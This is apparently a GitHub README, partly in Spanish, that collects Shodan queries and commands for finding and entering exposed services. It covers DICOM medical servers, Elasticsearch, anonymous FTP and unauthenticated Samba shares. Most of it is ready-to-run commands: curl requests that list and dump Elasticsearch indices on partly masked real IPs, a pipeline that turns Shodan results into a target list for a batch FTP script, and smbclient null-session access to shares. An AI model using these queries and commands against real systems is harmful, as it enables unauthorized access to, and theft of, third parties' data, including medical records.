# Exploits-Shodan

Recopilación de Querys de shodan con scripts personalizados :)

# DICOM 

```sh
"DICOM Server Response" port:104
```
```sh
python3 Dicom.py
```

![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/29f923e0-fbde-4526-a199-fbf71cb5319f)



# Elasticsearch

```sh
port:"9200" elastic: "Total Size:"
```
```sh
curl -X GET "http://192.x.x.153:9200/_cat/indices?v"
curl -X GET "http://192.x.x.153:9200/.monitoring-beats-7-2023.08.30"
curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
```

```sh
python3 elastic.py -t 192.x.x.153
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/25dadba2-91d2-4bc6-9a91-6c238120d557)


## Access FTP Anonymous

```sh
"220" "230 Login successful." port:21
230 'anonymous@' login ok 
"Anonymous+access+allowed" port:"21"
```

```sh
shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator " " | awk '{print $1}' | cat > ips.txt
```
```sh
python3 ftp.py -l ips.txt
```
![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/79f7941a-5d48-4ebd-9a6e-daa2b384ab9a)



# Authentication Disabled SMB

```sh
"Authentication: disabled" port:445 product:"Samba" 
```
```sh
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```

![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/da427f4b-0f7b-4f2b-9b0e-326da7e78420)
